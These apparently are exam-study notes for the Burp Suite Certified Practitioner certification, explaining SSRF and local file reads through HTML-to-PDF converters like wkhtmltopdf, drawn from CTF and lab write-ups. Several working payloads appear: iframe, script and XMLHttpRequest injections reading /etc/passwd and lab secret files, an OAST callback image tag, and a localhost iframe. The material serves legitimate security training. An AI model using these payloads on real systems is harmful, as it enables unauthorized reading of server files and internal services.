
### HTML to PDF
https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#html-to-pdf

> **Identify** a PDF download function and the `source code` uses `JSON.stringify` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target `downloadReport.js`.

```js
function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  
```

> **Note:** The `<div>` tag defines a division or a section in an HTML document. The
> 
> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)

```html
<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
```

> Identify file download HTML-to-PDF convert function on target is vulnerable.

```js
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```

> Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).

[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)

> Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as `wkhtmltopdf` to read local file, resulting in [SSRF to Local File Read Exploit in Hassan's blog](http://hassankhanyusufzai.com/SSRF-to-LFI/).

> Thehackerish showing wkHTMLtoPDF exploitation using [root-me.org - Gemini-Pentest-v1](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345) by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.

[![root-me ctf Gemini pentest v1](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-gemini-pentest-v1.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-gemini-pentest-v1.png)

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```

> JSON POST request body containing the HTMLtoPDF formatted payload to read local file.

```json
{
 "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```

[![root-me ctf wkhtmltopdf 0.12.4](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-wkhtmltopdf0.12.4.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-wkhtmltopdf0.12.4.png)

> Above the display name is injected with `HTML` payload and on export the HTML-to-PDF converter perform SSRF.

> The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in [HackTricks - Server Side XSS - Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) there is cross site scripting and server side exploits documented.

---

### Admin panel - Download report as PDF SSRF
https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel---download-report-as-pdf-ssrf

`/admin/download-metrics`
[![image](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)
```
<iframe src='http://localhost:6566/secret' height='500' width='500'>

# if the above doesn't work, try adding
file:///home/carlos/secret
```

> [https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/)


